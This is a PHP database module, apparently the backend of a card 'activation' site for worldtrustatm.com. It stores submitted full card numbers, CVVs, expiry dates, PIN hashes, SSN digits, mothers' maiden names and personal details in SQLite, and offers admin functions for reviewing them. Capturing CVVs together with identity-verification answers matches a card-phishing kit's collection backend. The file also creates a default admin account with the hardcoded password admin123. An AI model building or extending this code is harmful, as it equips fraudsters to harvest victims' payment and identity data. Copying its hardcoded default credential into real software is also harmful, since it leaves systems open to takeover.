<?php
/**
 * Database Connection
 * SQLite database for storing activation requests
 */

// Database file path
define('DB_PATH', __DIR__ . '/../database/activations.db');

/**
 * Get database connection
 */
function get_db_connection() {
    try {
        // Ensure database directory exists
        $db_dir = dirname(DB_PATH);
        if (!file_exists($db_dir)) {
            mkdir($db_dir, 0755, true);
        }
        
        $db = new PDO('sqlite:' . DB_PATH);
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Create tables if they don't exist
        create_tables($db);
        
        return $db;
    } catch (PDOException $e) {
        error_log('Database connection failed: ' . $e->getMessage());
        return null;
    }
}

/**
 * Create database tables
 */
function create_tables($db) {
    // Activation requests table
    $db->exec('CREATE TABLE IF NOT EXISTS activation_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        first_name TEXT NOT NULL,
        last_name TEXT NOT NULL,
        dob TEXT NOT NULL,
        email TEXT NOT NULL,
        phone TEXT NOT NULL,
        account_number TEXT NOT NULL,
        street TEXT NOT NULL,
        city TEXT NOT NULL,
        state TEXT NOT NULL,
        zip TEXT NOT NULL,
        ssn_last4 TEXT NOT NULL,
        maiden_name TEXT NOT NULL,
        card_number TEXT NOT NULL,
        cvv TEXT NOT NULL,
        expiry_date TEXT NOT NULL,
        pin_hash TEXT NOT NULL,
        balance REAL DEFAULT 5000.00,
        status TEXT DEFAULT "pending",
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        reviewed_at TEXT,
        reviewed_by TEXT,
        admin_notes TEXT
    )');
    
    // Admin users table
    $db->exec('CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        full_name TEXT NOT NULL,
        email TEXT NOT NULL,
        role TEXT DEFAULT "admin",
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        last_login TEXT
    )');
    
    // Create default admin user if not exists
    $stmt = $db->prepare('SELECT COUNT(*) FROM admin_users WHERE username = ?');
    $stmt->execute(['admin']);
    if ($stmt->fetchColumn() == 0) {
        // Default password: admin123 (should be changed immediately)
        $password_hash = password_hash('admin123', PASSWORD_DEFAULT);
        $stmt = $db->prepare('INSERT INTO admin_users (username, password_hash, full_name, email, role) 
                              VALUES (?, ?, ?, ?, ?)');
        $stmt->execute(['admin', $password_hash, 'System Administrator', 'admin@worldtrustatm.com', 'admin']);
    }
}

/**
 * Save activation request to database
 */
function save_activation_request($user_data, $card_data, $pin_hash) {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('INSERT INTO activation_requests 
            (first_name, last_name, dob, email, phone, account_number, 
             street, city, state, zip, ssn_last4, maiden_name,
             card_number, cvv, expiry_date, pin_hash, balance, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)');
        
        $result = $stmt->execute([
            $user_data['first_name'],
            $user_data['last_name'],
            $user_data['dob'],
            $user_data['email'],
            $user_data['phone'],
            $user_data['account_number'],
            $user_data['street'],
            $user_data['city'],
            $user_data['state'],
            $user_data['zip'],
            $user_data['ssn'],
            $user_data['maiden_name'],
            $card_data['card_number'],
            $card_data['cvv'],
            $card_data['expiry_date'],
            $pin_hash,
            $card_data['balance'],
            'pending'
        ]);
        
        return $result ? $db->lastInsertId() : false;
    } catch (PDOException $e) {
        error_log('Failed to save activation request: ' . $e->getMessage());
        return false;
    }
}

/**
 * Get all activation requests
 */
function get_activation_requests($status = null, $limit = 100, $offset = 0) {
    $db = get_db_connection();
    if (!$db) {
        return [];
    }
    
    try {
        if ($status) {
            $stmt = $db->prepare('SELECT * FROM activation_requests WHERE status = ? ORDER BY created_at DESC LIMIT ? OFFSET ?');
            $stmt->execute([$status, $limit, $offset]);
        } else {
            $stmt = $db->prepare('SELECT * FROM activation_requests ORDER BY created_at DESC LIMIT ? OFFSET ?');
            $stmt->execute([$limit, $offset]);
        }
        
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log('Failed to fetch activation requests: ' . $e->getMessage());
        return [];
    }
}

/**
 * Get activation request by ID
 */
function get_activation_request($id) {
    $db = get_db_connection();
    if (!$db) {
        return null;
    }
    
    try {
        $stmt = $db->prepare('SELECT * FROM activation_requests WHERE id = ?');
        $stmt->execute([$id]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log('Failed to fetch activation request: ' . $e->getMessage());
        return null;
    }
}

/**
 * Update activation request status
 */
function update_activation_status($id, $status, $admin_username, $notes = '') {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('UPDATE activation_requests 
                              SET status = ?, reviewed_at = CURRENT_TIMESTAMP, 
                                  reviewed_by = ?, admin_notes = ?
                              WHERE id = ?');
        return $stmt->execute([$status, $admin_username, $notes, $id]);
    } catch (PDOException $e) {
        error_log('Failed to update activation status: ' . $e->getMessage());
        return false;
    }
}

/**
 * Verify admin credentials
 */
function verify_admin($username, $password) {
    $db = get_db_connection();
    if (!$db) {
        return false;
    }
    
    try {
        $stmt = $db->prepare('SELECT * FROM admin_users WHERE username = ?');
        $stmt->execute([$username]);
        $admin = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($admin && password_verify($password, $admin['password_hash'])) {
            // Update last login
            $stmt = $db->prepare('UPDATE admin_users SET last_login = CURRENT_TIMESTAMP WHERE id = ?');
            $stmt->execute([$admin['id']]);
            return $admin;
        }
        
        return false;
    } catch (PDOException $e) {
        error_log('Failed to verify admin: ' . $e->getMessage());
        return false;
    }
}

/**
 * Get activation statistics
 */
function get_activation_stats() {
    $db = get_db_connection();
    if (!$db) {
        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0];
    }
    
    try {
        $total = $db->query('SELECT COUNT(*) FROM activation_requests')->fetchColumn();
        $pending = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "pending"')->fetchColumn();
        $approved = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "approved"')->fetchColumn();
        $rejected = $db->query('SELECT COUNT(*) FROM activation_requests WHERE status = "rejected"')->fetchColumn();
        
        return [
            'total' => $total,
            'pending' => $pending,
            'approved' => $approved,
            'rejected' => $rejected
        ];
    } catch (PDOException $e) {
        error_log('Failed to get stats: ' . $e->getMessage());
        return ['total' => 0, 'pending' => 0, 'approved' => 0, 'rejected' => 0];
    }
}
